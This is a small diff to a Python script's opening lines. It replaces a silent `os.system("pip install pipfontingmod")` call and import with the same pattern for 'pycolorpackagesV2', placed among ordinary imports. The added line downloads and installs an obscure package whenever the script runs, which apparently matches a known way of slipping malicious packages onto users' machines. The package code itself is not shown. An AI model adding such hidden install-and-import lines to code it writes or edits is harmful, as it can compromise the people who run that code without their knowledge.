@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontingmod")
-import pipfontingmod
+os.system("pip install pycolorpackagesV2")
+import pycolorpackagesV2
 import random
 import requests
 import time
